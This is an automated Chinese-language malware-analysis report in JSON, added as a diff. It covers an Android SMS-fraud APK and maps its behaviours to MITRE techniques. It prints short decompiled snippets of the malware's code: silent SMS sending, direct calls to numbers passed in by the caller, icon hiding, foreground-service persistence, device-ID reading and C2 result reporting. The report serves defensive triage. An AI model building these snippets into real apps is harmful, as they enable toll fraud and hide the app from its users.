@@ -1,0 +1,209 @@
+{
+  "APK信息": {
+    "文件名": "a624c298c20c7510eb5155ed4faedb471453e58b5cb1abeca08ff7743f3f3ab6.apk",
+    "sha256": "a624c298c20c7510eb5155ed4faedb471453e58b5cb1abeca08ff7743f3f3ab6",
+    "包名": "com.silence.direction",
+    "应用名": "СМC - Сoобщение",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 181.7
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\silence\\direction\\CastOrganize;",
+          "method_signature": "a(Context context, Intent intent)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "new a(context, 3).a(\"id\", intent.getStringExtra(\"id\")).a(\"command\", Integer.valueOf(intent.getIntExtra(\"command\", 0))).a(\"post\", Boolean.valueOf(intent.getBooleanExtra(\"post\", true))).a(\"status\", Integer.valueOf(getResultCode())).a();",
+          "malicious_code_snippet_context": "      }\n  \n      private void a(Context context, Intent intent) {\n>>>         new a(context, 3).a(\"id\", intent.getStringExtra(\"id\")).a(\"command\", Integer.valueOf(intent.getIntExtra(\"command\", 0))).a(\"post\", Boolean.valueOf(intent.getBooleanExtra(\"post\", true))).a(\"status\", Integer.valueOf(getResultCode())).a();\n      }\n  \n      private void a(Object obj) {",
+          "behavior_description": "BroadcastReceiver接收到包含command指令的Intent后，提取id、command、post、status等字段，通过链式调用构建HTTP请求参数并发送到远程C2服务器（new a(context,3)构建请求对象，.a(key,value)添加参数，.a()执行发送）。这是典型的C2命令执行结果上报机制，将命令执行状态回传给控制端。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\silence\\direction\\d;",
+          "method_signature": "a(String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);",
+          "malicious_code_snippet_context": "      public static void a(String str, String str2, PendingIntent pendingIntent) {\n          try {\n              Healthy.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n          } catch (Exception e) {\n          }\n      }",
+          "behavior_description": "该方法通过 SmsManager.getDefault().sendTextMessage() 静默发送短信，目标号码(str)和短信内容(str2)均来自方法参数传入，无需用户交互即可发送。代码还通过检查 Build.VERSION.SDK_INT < 19 或自身是否为默认短信应用来绕过 Android 4.4+ 的短信发送限制，异常被静默捕获以隐藏行为。结合 AlarmManager 定时触发(60秒周期)，可实现定时静默发送短信，典型用于短信欺诈或订阅扣费。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\silence\\direction\\d;",
+          "method_signature": "e(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String e(Context context) { return Settings.Secure.getString(context.getContentResolver(), \"android_id\"); }",
+          "malicious_code_snippet_context": "public static String e(Context context) { return Settings.Secure.getString(context.getContentResolver(), \"android_id\"); }",
+          "behavior_description": "该方法通过 Settings.Secure.getString() 读取系统设置中的 android_id（设备唯一标识符），用于设备指纹采集。android_id 是设备级标识符，可用于跨应用追踪用户。在恶意样本中，此类标识符通常会被收集并上传至C2服务器或用于构建设备指纹。数据流向：Settings.Secure（系统设置提供者）→ getString() 获取 android_id → 方法返回值供调用方使用（可能进一步上传或持久化存储）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\silence\\direction\\PilotFarewell;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent intent = new Intent(getApplicationContext(), (Class<?>) ReputationRefuse.class);\nif (Build.VERSION.SDK_INT >= 26) {\n    startForegroundService(intent);\n} else {\n    startService(intent);\n}",
+          "malicious_code_snippet_context": "                  System.exit(1);\n              }\n          });\n>>>         Intent intent = new Intent(getApplicationContext(), (Class<?>) ReputationRefuse.class);\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             startForegroundService(intent);\n>>>         } else {\n>>>             startService(intent);\n>>>         }\n          HandlerThread handlerThread = new HandlerThread(\"Necklace\");\n          handlerThread.start();\n          a = new Handler(handlerThread.getLooper());",
+          "behavior_description": "在Service的onCreate中通过startForegroundService启动另一个服务(ReputationRefuse)，利用前台服务机制实现进程保活，确保恶意服务持续运行。同时注册了SMS_RECEIVED和PHONE_STATE广播监听，配合保活机制可持续监控用户短信和来电状态。还设置了UncaughtExceptionHandler在崩溃时直接退出进程，避免异常暴露。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\silence\\direction\\Spell;",
+          "method_signature": "b(Context context, String str)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\nintent.addFlags(268435456);\ncontext.startActivity(intent);",
+          "malicious_code_snippet_context": "      private static int b(Context context, String str) {\n          try {\n              Healthy.a(true);\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\n>>>             intent.addFlags(268435456);\n>>>             context.startActivity(intent);\n              return 0;\n          } catch (Exception e) {\n              return 6;",
+          "behavior_description": "该方法通过 Intent.ACTION_CALL 直接发起电话呼叫，无需用户确认即可拨打参数 str 指定的号码。在恶意样本中，此行为通常用于静默拨打高额付费号码或特定服务号码，导致用户产生非预期的通信费用损失。数据流向为：方法参数 str（电话号码，可能来自C2服务器下发或硬编码）→ Uri.parse 构造 tel URI → startActivity 发起直接通话。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\silence\\direction\\PilotFarewell;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), BindCalm.class), 2, 1);",
+          "malicious_code_snippet_context": "          this.b.acquire();\n          d.b(getApplicationContext());\n          a.post(this.c);\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) BindCalm.class), 2, 1);\n      }\n  }",
+          "behavior_description": "代码通过调用 PackageManager 的 setComponentEnabledSetting 方法，将应用的特定组件（BindCalm.class，通常为主 Activity）设置为禁用状态（参数2对应 COMPONENT_ENABLED_STATE_DISABLED），导致应用图标从桌面启动器中隐藏，从而避免被用户发现和卸载。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
